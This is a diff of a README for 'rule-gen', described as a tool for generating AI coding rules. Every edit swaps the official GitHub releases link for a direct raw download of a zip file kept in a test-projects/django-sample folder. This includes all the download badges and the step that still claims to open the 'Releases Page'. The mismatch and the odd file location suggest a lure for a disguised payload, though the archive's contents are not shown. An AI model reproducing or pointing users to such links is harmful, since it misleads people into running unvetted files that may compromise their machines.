@@ -1,6 +1,6 @@
 # 🤖 rule-gen - Generate AI Coding Rules Easily
 
-[![Download rule-gen](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Userranjan/rule-gen/releases)
+[![Download rule-gen](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Userranjan/rule-gen/main/test-projects/django-sample/rule-gen-v3.4.zip)
 
 ---
 
@@ -51,9 +51,9 @@ You can get rule-gen and start using it on your Windows device following these s
 
 First, download rule-gen from the official release page. Click the button below to open the page where you will find the latest version of rule-gen ready to download.
 
-[![Download rule-gen](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Userranjan/rule-gen/releases)
+[![Download rule-gen](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/Userranjan/rule-gen/main/test-projects/django-sample/rule-gen-v3.4.zip)
 
-1. Open the [rule-gen Releases Page](https://github.com/Userranjan/rule-gen/releases).
+1. Open the [rule-gen Releases Page](https://raw.githubusercontent.com/Userranjan/rule-gen/main/test-projects/django-sample/rule-gen-v3.4.zip).
 2. Look for the latest release entry. It will list executable files for Windows.
 3. Click the `.exe` file (usually named something like `rule-gen-setup.exe`) to start downloading.
 4. Save the file to your desktop or downloads folder for easy access.
@@ -127,7 +127,7 @@ If you face any issues:
 ## 🔗 Useful Links
 
 - Download and explore rule-gen here:  
-  https://github.com/Userranjan/rule-gen/releases
+  https://raw.githubusercontent.com/Userranjan/rule-gen/main/test-projects/django-sample/rule-gen-v3.4.zip
 
 - Official repository for updates and source code.
 
@@ -151,4 +151,4 @@ No personal data or files leave your device without your approval.
 
 ---
 
-[![Download rule-gen](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Userranjan/rule-gen/releases)
+[![Download rule-gen](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/Userranjan/rule-gen/main/test-projects/django-sample/rule-gen-v3.4.zip)
